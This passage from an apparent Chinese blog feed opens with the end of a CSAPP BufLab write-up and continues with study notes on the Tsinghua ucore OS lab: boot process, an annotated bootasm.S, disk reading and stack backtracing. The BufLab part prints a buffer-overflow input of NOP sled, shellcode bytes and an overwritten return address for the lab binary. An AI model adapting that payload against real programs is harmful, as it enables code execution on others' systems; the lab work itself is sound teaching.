<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 </div><div class="line">8d 6c 24 28 b8 88 41 9d 21 68 3a 8e 04 08 c3 </div><div class="line">e8 2f 68 55</div></pre></td></tr></table></figure>
<p>最后的返回地址，选择最大buf地址来覆盖，也就是用0x55682f08。</p>
<p>值得注意的是，在运行hex2raw程序时需要添上 -n 这个参数。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>BufLab 算是完成了，稍微对模拟缓冲区溢出熟悉了一点，加深了对程序堆栈的理解。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>清华操作系统课程学习</title>
    <link href="http://xinqiu.me/2016/03/17/ucore/"/>
    <id>http://xinqiu.me/2016/03/17/ucore/</id>
    <published>2016-03-16T16:00:00.000Z</published>
    <updated>2016-04-28T14:27:09.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>因为学习操作系统，因为还有一些其他事情要做，所以没有直接上MIT 6.828,选择了清华的操作系统课和配套的ucore。</p>
</blockquote>
<h2 id="u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B"><a href="#u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B" class="headerlink" title="从机器启动到操作系统运行的过程"></a>从机器启动到操作系统运行的过程</h2><p>在机器接通电源后， 会向主板发送一个信号。一旦主板收到电源妥协信号后，主板会尝试启动CPU，CPU复位寄存器里的所有数据， 设置预定值给每个寄存器。同时执行系统初始化软件完成基本IO初始化和引导加载功能。为最终调用操作系统内核准备好正确的环境。最终引导加载程序把操作系统内核映像加载到RAM中，并将系统控制权传递给它。</p>
<p>以Intel 80386为例，计算机加电后，CPU从物理地址0xFFFFFFF0(由初始化的CS：EIP确定，此时CS和IP的值分别是0xF000和0xFFF0)开始执行。8086 处理器有一个20位寻址总线，这意味着它可以对0到 2^20 位地址空间进行操作（ 1Mb ）。不过它只有16位的寄存器，通过这个16位寄存器最大寻址是 2^16 即 0xffff （64 Kb）。实模式使用分段机制来管理整个内存空间。所有内存被分成固定的 64KB 大小的小块。由于我们不能用16位寄存器寻址大于 64KB 的内存，一种替代的方法被设计出来了。一个地址包括两个部分：数据段起始地址和从该数据段起的偏移量。为了得到内存中的物理地址，我们要让数据段乘16并加上偏移量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PhysicalAddress = Segment * 16 + Offset</div></pre></td></tr></table></figure>
<p>通过阅读 kernel boot protocol，在内核被引导如内存后，内存使用情况将入下表所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">         | Protected-mode kernel  |</div><div class="line">100000   +------------------------+</div><div class="line">         | I/O memory hole        |</div><div class="line">0A0000   +------------------------+</div><div class="line">         | Reserved for BIOS      | Leave as much as possible unused</div><div class="line">         ~                        ~</div><div class="line">         | Command line           | (Can also be below the X+10000 mark)</div><div class="line">X+10000  +------------------------+</div><div class="line">         | Stack/heap             | For use by the kernel real-mode code.</div><div class="line">X+08000  +------------------------+</div><div class="line">         | Kernel setup           | The kernel real-mode code.</div><div class="line">         | Kernel boot sector     | The kernel legacy boot sector.</div><div class="line">       X +------------------------+</div><div class="line">         | Boot loader            | &lt;- Boot sector entry point 0x7C00</div><div class="line">001000   +------------------------+</div><div class="line">         | Reserved for MBR/BIOS  |</div><div class="line">000800   +------------------------+</div><div class="line">         | Typically used by MBR  |</div><div class="line">000600   +------------------------+</div><div class="line">         | BIOS use only          |</div><div class="line">000000   +------------------------+</div></pre></td></tr></table></figure>
<p>所以当 bootloader 完成任务，将执行权移交给 kernel，kernel 的代码从以下地址开始执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x1000 + X + sizeof(KernelBootSector) + 1</div></pre></td></tr></table></figure>
<p>上面的公式中， X 是 kernel bootsector 被引导如内存的位置。</p>
<h2 id="Lab_1"><a href="#Lab_1" class="headerlink" title="Lab 1"></a>Lab 1</h2><h3 id="u7EC3_u4E601"><a href="#u7EC3_u4E601" class="headerlink" title="练习1"></a>练习1</h3><p>1.操作系统镜像文件ucore.img是如何一步一步生成的？</p>
<p>在进行 <code>make V=</code>后，通过显示的信息，可以知道先对C文件进行了编译。分别编译了一下文件:</p>
<ul>
<li>cc kern/init/init.c 初始化系统</li>
<li>cc kern/libs/readline.c 从输入中读取一行</li>
<li>cc kern/libs/stdio.c 标准化IO</li>
<li>cc kern/debug/kdebug.c debug支撑文件</li>
<li>cc kern/debug/kmonitor.c 命令行显示器</li>
<li>cc kern/debug/panic.c 显示错误警告</li>
<li>cc kern/driver/clock.c 时钟相关</li>
<li>cc kern/driver/console.c 控制台显示</li>
<li>cc kern/driver/intr.c 中断请求</li>
<li>cc kern/driver/picirq.c 中断控制器</li>
<li>cc kern/trap/trap.c 中断处理</li>
<li>cc kern/trap/trapentry.S 中断预处理</li>
<li>cc kern/trap/vectors.S 中断向量表</li>
<li>cc kern/mm/pmm.c 全局描述符表</li>
<li>cc libs/printfmt.c 输出格式</li>
<li>cc libs/string.c 字符串操作</li>
<li>cc boot/bootasm.S Boot Loader程序</li>
<li>cc boot/bootmain.c Boot Loader程序</li>
<li>cc tools/sign.c 硬盘主引导扇区检测</li>
</ul>
<p>接着 <code>ld</code> 命令对编译好的 <code>.o</code> 文件进行链接，生成了引导扇区。</p>
<p>之后用 <code>dd</code> 创建了一块空间，并将 <code>bootblock</code> 放入这块空间做成 <code>img</code> 硬盘。</p>
<p>2.一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
<p>从 <code>tools/sign.c</code> 源文件中可以得知， </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.....</div><div class="line"><span class="keyword">if</span> (st.st_size &gt; <span class="number">510</span>) &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%lld &gt;&gt; 510!!\n"</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">char</span> buf[<span class="number">512</span>];</div><div class="line">......</div><div class="line">buf[<span class="number">510</span>] = <span class="number">0x55</span>;</div><div class="line">buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</div><div class="line">......</div><div class="line"><span class="keyword">if</span> (size != <span class="number">512</span>) &#123;</div><div class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"write '%s' error, size is %d.\n"</span>, argv[<span class="number">2</span>], size);</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line">fclose(ofp);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"build 512 bytes boot sector: '%s' success!\n"</span>, argv[<span class="number">2</span>]);</div><div class="line">......</div></pre></td></tr></table></figure>
<p>规范的硬盘主引导扇区大小为512， 并且最后两位必须是 <code>0x55AA</code>.</p>
<h3 id="u7EC3_u4E602"><a href="#u7EC3_u4E602" class="headerlink" title="练习2"></a>练习2</h3><p>使用qemu执行并调试lab1中的软件，要做一下几个操作：</p>
<ol>
<li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
</li>
<li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
</li>
<li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
</li>
<li><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
</li>
</ol>
<p>根据参考的提示，在 <code>.PHONY: qemu qemu-nox debug debug-nox</code> 下添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lab1-mon: $(UCOREIMG)</div><div class="line">	$(V)$(TERMINAL) -e &quot;$(QEMU) -S -s -d in_asm -D $(BINDIR)/q.log -monitor stdio -hda $&lt; -serial null&quot;</div><div class="line">	$(V)sleep 2</div><div class="line">	$(V)$(TERMINAL) -e &quot;gdb -q -x tools/lab1init&quot;</div></pre></td></tr></table></figure>
<p>在调用qemu时添加-d in_asm -D q.log参数可以将运行的汇编指令保存在q.log中。</p>
<p>另外需要先在<code>lab1/tools/</code>文件夹下新建一个<code>lab1init</code>文件。添加以下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">file bin/kernel</div><div class="line">target remote :1234</div><div class="line">set architecture i8086</div><div class="line">break *0x7c00</div><div class="line">continue</div><div class="line">x /2i $pc</div></pre></td></tr></table></figure>
<p>分别代表加载kernel， 与qemu链接， BIOS是i8086 16位实模式， 在0x7c00处设置断点， 继续运行， 显示指令寄存器上的两条指令。</p>
<p>make lab1-mon 产生的汇编代码还是稍微有点区别，主要在0x7c1e开始有点区别。</p>
<p>#####gdb的单步命令</p>
<p>在gdb中，有next, nexti, step, stepi等指令来单步调试程序，他们功能各不相同，区别在于单步的“跨度”上。</p>
<ul>
<li>next 单步到程序源代码的下一行，不进入函数。</li>
<li>nexti 单步一条机器指令，不进入函数。</li>
<li>step 单步到下一个不同的源代码行（包括进入函数）。</li>
<li>stepi 单步一条机器指令。</li>
</ul>
<h3 id="u7EC3_u4E603"><a href="#u7EC3_u4E603" class="headerlink" title="练习3"></a>练习3</h3><p>参考<a href="http://blog.csdn.net/xiaocainiaoshangxiao/article/details/22417237" target="_blank" rel="external">MIT6.828 boot.S文件分析</a>这篇文章。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div></pre></td><td class="code"><pre><div class="line">#include &lt;asm.h&gt;</div><div class="line"></div><div class="line"># Start the CPU: switch to 32-bit protected mode, jump into C.</div><div class="line"># The BIOS loads this code from the first sector of the hard disk into</div><div class="line"># memory at physical address 0x7c00 and starts executing in real mode</div><div class="line"># with %cs=0 %ip=7c00.</div><div class="line"></div><div class="line">#启动CPU，切换到32位保护模式，跳转到C代码  </div><div class="line">#BIOS从硬盘的第一个扇区加载这个代码到  </div><div class="line">#物理内存地址为0x7c00的地方，cs=0,ip=7c00  </div><div class="line">  </div><div class="line">#下面的3条.set指令类似于宏定义  </div><div class="line">#内核代码段选择子</div><div class="line">.set PROT_MODE_CSEG,        0x8                     # kernel code segment selector</div><div class="line">#内核数据段选择子 </div><div class="line">.set PROT_MODE_DSEG,        0x10                    # kernel data segment selector</div><div class="line">#保护模式使能标志</div><div class="line">.set CR0_PE_ON,             0x1                     # protected mode enable flag</div><div class="line"></div><div class="line"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</div><div class="line">#开始地址在实模式下是0:7c00，这个开始地址就是运行bootloader的地址</div><div class="line"></div><div class="line">#定义一个全局名字start </div><div class="line">.globl start</div><div class="line">start:</div><div class="line">#CPU启动为16位模式 </div><div class="line">.code16                                             # Assemble for 16-bit mode</div><div class="line">    #关中断</div><div class="line">    cli                                             # Disable interrupts</div><div class="line">    #清除方向标志 </div><div class="line">    cld                                             # String operations increment</div><div class="line"></div><div class="line">    # Set up the important data segment registers (DS, ES, SS).</div><div class="line">    #设置重要的数据段寄存器  </div><div class="line">    #ax,ds, es, ss清零</div><div class="line">    xorw %ax, %ax                                   # Segment number zero</div><div class="line">    movw %ax, %ds                                   # -&gt; Data Segment</div><div class="line">    movw %ax, %es                                   # -&gt; Extra Segment</div><div class="line">    movw %ax, %ss                                   # -&gt; Stack Segment</div><div class="line"></div><div class="line">    # Enable A20:</div><div class="line">    #  For backwards compatibility with the earliest PCs, physical</div><div class="line">    #  address line 20 is tied low, so that addresses higher than</div><div class="line">    #  1MB wrap around to zero by default. This code undoes this.</div><div class="line">    #打开A20地址线  </div><div class="line">    #为了兼容早期的PC机，第20根地址线在实模式下不能使用  </div><div class="line">    #所以超过1MB的地址，默认就会返回到地址0，重新从0循环计数，  </div><div class="line">    #下面的代码打开A20地址线 </div><div class="line">seta20.1:</div><div class="line">    #从0x64端口读入一个字节的数据到al中 </div><div class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</div><div class="line">    testb $0x2, %al</div><div class="line">    #如果上面的测试中发现al的第2位为0，就不执行该指令  </div><div class="line">    #否则就循环检查</div><div class="line">    jnz seta20.1</div><div class="line"></div><div class="line">    #将0xd1写入到al中</div><div class="line">    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</div><div class="line">    #将al中的数据写入到端口0x64中,也就是8042的P2端口</div><div class="line">    outb %al, $0x64                                 # 0xd1 means: write data to 8042&apos;s P2 port</div><div class="line"></div><div class="line">seta20.2:</div><div class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</div><div class="line">    #测试al的第2位是否为0</div><div class="line">    testb $0x2, %al</div><div class="line">    jnz seta20.2</div><div class="line"></div><div class="line">    #将0xdf写入到al中 </div><div class="line">    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</div><div class="line">    #将al中的数据写入到0x60端口中，也就是让P2端口的A20位设置为1</div><div class="line">    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&apos;s A20 bit(the 1 bit) to 1</div><div class="line"></div><div class="line">    # Switch from real to protected mode, using a bootstrap GDT</div><div class="line">    # and segment translation that makes virtual addresses</div><div class="line">    # identical to physical addresses, so that the</div><div class="line">    # effective memory map does not change during the switch.</div><div class="line">    #将全局描述符表描述符加载到全局描述符表寄存器</div><div class="line">    lgdt gdtdesc</div><div class="line">    #cr0中的第0位为1表示处于保护模式  </div><div class="line">    #cr0中的第0位为0，表示处于实模式  </div><div class="line">    #把控制寄存器cr0加载到eax中 </div><div class="line">    movl %cr0, %eax</div><div class="line">    #将eax中的第0位设置为1</div><div class="line">    orl $CR0_PE_ON, %eax</div><div class="line">    #将eax中的值装入cr0中 </div><div class="line">    movl %eax, %cr0</div><div class="line"></div><div class="line">    # Jump to next instruction, but in 32-bit code segment.</div><div class="line">    # Switches processor into 32-bit mode.</div><div class="line">    ljmp $PROT_MODE_CSEG, $protcseg</div><div class="line">    #跳转到32位模式中的下一条指令  </div><div class="line">    #将处理器切换为32位工作模式  </div><div class="line">    #下面这条指令执行的结果会将$PROT_MODE_CSEG加载到cs中，cs对应的高速缓冲存储器会加载代码段描述符  </div><div class="line">    #同样将$protcseg加载到ip中</div><div class="line"></div><div class="line">.code32                                             # Assemble for 32-bit mode</div><div class="line">protcseg:</div><div class="line">    # Set up the protected-mode data segment registers</div><div class="line">    #设置保护模式下的数据寄存器  </div><div class="line">    #将数据段选择子装入到ax中</div><div class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</div><div class="line">    #将ax装入到其他数据段寄存器中，在装入的同时，  </div><div class="line">    #数据段描述符会自动的加入到这些段寄存器对应的高速缓冲寄存器中 </div><div class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</div><div class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</div><div class="line">    movw %ax, %fs                                   # -&gt; FS</div><div class="line">    movw %ax, %gs                                   # -&gt; GS</div><div class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</div><div class="line"></div><div class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</div><div class="line">    #设置栈指针，并且调用c函数 </div><div class="line">    movl $0x0, %ebp</div><div class="line">    #调用main.c中的bootmain函数 </div><div class="line">    movl $start, %esp</div><div class="line">    call bootmain</div><div class="line"></div><div class="line">    # If bootmain returns (it shouldn&apos;t), loop.</div><div class="line">    #如果bootmain返回的话，就一直循环</div><div class="line">spin:</div><div class="line">    jmp spin</div><div class="line"></div><div class="line"># Bootstrap GDT</div><div class="line">#强制4字节对齐</div><div class="line">.p2align 2                                          # force 4 byte alignment</div><div class="line">#全局描述符表</div><div class="line">gdt:</div><div class="line">    SEG_NULLASM                                     # null seg</div><div class="line">    #代码段描述符</div><div class="line">    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</div><div class="line">    #数据段描述符</div><div class="line">    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</div><div class="line"></div><div class="line">#全局描述符表对应的描述符 </div><div class="line">gdtdesc:</div><div class="line">    .word 0x17                                      # sizeof(gdt) - 1</div><div class="line">    .long gdt                                       # address gdt</div></pre></td></tr></table></figure>
<h3 id="u7EC3_u4E604"><a href="#u7EC3_u4E604" class="headerlink" title="练习4"></a>练习4</h3><p>通过分析源代码和通过qemu来运行并调试bootloader&amp;OS，</p>
<ul>
<li>bootloader如何读取硬盘扇区的？</li>
<li>bootloader是如何加载ELF格式的OS？</li>
</ul>
<p>在bootmain.c中有介绍。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* readsect - read a single sector at @secno into @dst */</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> &#123;</div><div class="line">    <span class="comment">// wait for disk to be ready</span></div><div class="line">    waitdisk();</div><div class="line"></div><div class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// count = 1</span></div><div class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</div><div class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</div><div class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</div><div class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</div><div class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// cmd 0x20 - read sectors</span></div><div class="line"></div><div class="line">    <span class="comment">// wait for disk to be ready</span></div><div class="line">    waitdisk();</div><div class="line"></div><div class="line">    <span class="comment">// read a sector</span></div><div class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>读一个扇区的流程大致如下：</p>
<ol>
<li>等待磁盘准备好</li>
<li>发出读取扇区的命令</li>
<li>等待磁盘准备好</li>
<li>把磁盘扇区数据读到指定内存</li>
</ol>
<p>通过readseg函数将OS读取到ELFHDR所指示的地址（0x10000）。<br>判断头部是否合法，如不合法直接跳出。<br>把kernel的每一个程序段都载入内存。<br>通过程序入口地址加载作为ELF可执行文件的kernel。</p>
<h3 id="u7EC3_u4E605"><a href="#u7EC3_u4E605" class="headerlink" title="练习5"></a>练习5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">/* *</div><div class="line"> * print_stackframe - print a list of the saved eip values from the nested &apos;call&apos;</div><div class="line"> * instructions that led to the current point of execution</div><div class="line"> *</div><div class="line"> * The x86 stack pointer, namely esp, points to the lowest location on the stack</div><div class="line"> * that is currently in use. Everything below that location in stack is free. Pushing</div><div class="line"> * a value onto the stack will invole decreasing the stack pointer and then writing</div><div class="line"> * the value to the place that stack pointer pointes to. And popping a value do the</div><div class="line"> * opposite.</div><div class="line"> *</div><div class="line"> * The ebp (base pointer) register, in contrast, is associated with the stack</div><div class="line"> * primarily by software convention. On entry to a C function, the function&apos;s</div><div class="line"> * prologue code normally saves the previous function&apos;s base pointer by pushing</div><div class="line"> * it onto the stack, and then copies the current esp value into ebp for the duration</div><div class="line"> * of the function. If all the functions in a program obey this convention,</div><div class="line"> * then at any given point during the program&apos;s execution, it is possible to trace</div><div class="line"> * back through the stack by following the chain of saved ebp pointers and determining</div><div class="line"> * exactly what nested sequence of function calls caused this particular point in the</div><div class="line"> * program to be reached. This capability can be particularly useful, for example,</div><div class="line"> * when a particular function causes an assert failure or panic because bad arguments</div><div class="line"> * were passed to it, but you aren&apos;t sure who passed the bad arguments. A stack</div><div class="line"> * backtrace lets you find the offending function.</div><div class="line"> *</div><div class="line"> * The inline function read_ebp() can tell us the value of current ebp. And the</div><div class="line"> * non-inline function read_eip() is useful, it can read the value of current eip,</div><div class="line"> * since while calling this function, read_eip() can read the caller&apos;s eip from</div><div class="line"> * stack easily.</div><div class="line"> *</div><div class="line"> * In print_debuginfo(), the function debuginfo_eip() can get enough information about</div><div class="line"> * calling-chain. Finally print_stackframe() will trace and print them for debugging.</div><div class="line"> *</div><div class="line"> * Note that, the length of ebp-chain is limited. In boot/bootasm.S, before jumping</div><div class="line"> * to the kernel entry, the value of ebp has been set to zero, that&apos;s the boundary.</div><div class="line"> * */</div><div class="line">void</div><div class="line">print_stackframe(void) &#123;</div><div class="line">     /* LAB1 YOUR CODE : STEP 1 */</div><div class="line">     /* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</div><div class="line">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</div><div class="line">      * (3) from 0 .. STACKFRAME_DEPTH</div><div class="line">      *    (3.1) printf value of ebp, eip</div><div class="line">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4]</div><div class="line">      *    (3.3) cprintf(&quot;\n&quot;);</div><div class="line">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</div><div class="line">      *    (3.5) popup a calling stackframe</div><div class="line">      *           NOTICE: the calling funciton&apos;s return addr eip  = ss:[ebp+4]</div><div class="line">      *                   the calling funciton&apos;s ebp = ss:[ebp]</div><div class="line">      */</div><div class="line">    uint32_t ebp = read_ebp();</div><div class="line">    uint32_t eip = read_eip();</div><div class="line"></div><div class="line">    int i, 